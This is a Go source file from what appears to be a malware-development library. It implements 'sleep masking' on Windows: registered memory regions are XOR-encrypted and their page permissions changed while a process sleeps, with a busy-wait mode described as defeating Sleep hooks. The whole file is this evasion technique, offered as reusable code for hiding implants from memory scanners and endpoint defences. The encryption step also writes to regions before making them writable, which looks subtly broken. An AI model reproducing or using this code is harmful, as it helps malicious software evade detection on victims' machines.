//go:build windows

package sleepmask

import (
	"crypto/rand"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/cleanup/memory"

	"github.com/oioio-space/maldev/evasion/timing"
)

// Region describes a memory region to encrypt during sleep.
type Region struct {
	Addr uintptr
	Size uintptr
}

// SleepMethod controls how the sleep is performed.
type SleepMethod int

const (
	// MethodNtDelay uses NtDelayExecution (standard, hookable).
	MethodNtDelay SleepMethod = iota
	// MethodBusyTrig uses CPU-burn trigonometric busy wait (defeats Sleep hooks).
	MethodBusyTrig
)

// Mask manages encrypted sleep for a set of memory regions.
type Mask struct {
	regions []Region
	method  SleepMethod
}

// New creates a Mask for the given memory regions.
func New(regions ...Region) *Mask {
	return &Mask{regions: regions, method: MethodNtDelay}
}

// WithMethod sets the sleep method.
func (m *Mask) WithMethod(method SleepMethod) *Mask {
	m.method = method
	return m
}

// Sleep encrypts all registered regions, sleeps for the given duration,
// then decrypts and restores original page permissions.
func (m *Mask) Sleep(d time.Duration) {
	if len(m.regions) == 0 || d <= 0 {
		return
	}

	// Generate random XOR key.
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return // cannot encrypt safely without a key
	}

	// Save original protections, encrypt, downgrade to RW.
	origProtect := make([]uint32, len(m.regions))
	for i, r := range m.regions {
		xorRegion(r.Addr, r.Size, key)
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i])
	}

	// Sleep.
	switch m.method {
	case MethodBusyTrig:
		timing.BusyWaitTrig(d)
	default:
		time.Sleep(d)
	}

	// Decrypt + restore ORIGINAL permissions (not hardcoded PAGE_EXECUTE_READ).
	for i, r := range m.regions {
		var tmp uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		xorRegion(r.Addr, r.Size, key)
		windows.VirtualProtect(r.Addr, r.Size, origProtect[i], &tmp)
	}

	// Securely zero the key to resist dead-store elimination.
	memory.SecureZero(key)
}

// xorRegion applies repeating-key XOR to a memory region in-place.
func xorRegion(addr, size uintptr, key []byte) {
	keyLen := uintptr(len(key))
	for i := uintptr(0); i < size; i++ {
		ptr := (*byte)(unsafe.Pointer(addr + i))
		*ptr ^= key[i%keyLen]
	}
}
